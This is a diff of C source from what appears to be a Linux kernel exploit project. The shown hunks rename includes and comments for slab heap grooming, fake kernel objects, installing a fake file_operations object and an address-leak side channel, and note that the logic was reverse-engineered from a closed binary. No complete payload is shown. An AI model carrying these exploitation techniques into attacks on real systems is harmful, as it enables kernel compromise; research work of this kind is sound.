@@ -1,5 +1,5 @@
 /* source: FUN_00106288's grooming choreography, reused from this
- * project's own proven src/util.c:prepare_kernel_page() (see groom.h for
+ * project's own proven src/util.c:prepare_kernel_page() (see 05_mm_slab_grooming.h for
  * the exact-match evidence). Only the final content write differs: this
  * calls build_fops_install_object() instead of the old engine's
  * put_slide_bank_entry(). */
@@ -19,10 +19,10 @@
 #include <time.h>
 #include <unistd.h>
 
-#include "diag_checkpoint.h"
-#include "fops_install.h"
-#include "groom.h"
-#include "slabinfo.h"
+#include "90_diagnostic_checkpoint.h"
+#include "04_fake_kernel_objects.h"
+#include "05_mm_slab_grooming.h"
+#include "02_slab_cache_probe.h"
 
 /* Debug instrumentation (H0): attribute the groom+install wall time to its
  * sub-phases (process spray, KernelSnitch collision search, bruteforce leak).
@@ -54,7 +54,7 @@ static long groom_env_long_clamped(const char *name, long fallback, long lo,
   }
   return v;
 }
-#include "kernelsnitch/kernelsnitch.h"
+#include "03_mm_address_sidechannel/mm_address_leak.h"
 
 #define OSS_PAGE_SIZE 4096
 #define OSS_MM_ORDER 3
@@ -174,12 +174,12 @@ static void release_ctx_storage(struct mm_ctx *ctx) {
   memset(ctx, 0, sizeof(*ctx));
 }
 
-/* source: fcn.000044f4 (this project's src/main.c:app_main() equivalent),
+/* source: fcn.000044f4 (this project's src/00_orchestrator.c:app_main() equivalent),
  * raw vaddr 0x4520-0x4570 -- getrlimit/setrlimit raising RLIMIT_NOFILE
  * and RLIMIT_NPROC's soft limit to the hard limit, confirmed via raw
  * disasm with asm.varsub disabled (r2's default variable naming
  * collided misleadingly with this function's own stack canary slot --
- * double-checked because of that). Applied here (not just in main.c's
+ * double-checked because of that). Applied here (not just in 00_orchestrator.c's
  * app_main(), which is the closed binary's real call site) so every
  * test harness in this project that calls groom_and_install_fops_object
  * directly gets the same protection -- this is exactly the class of fix
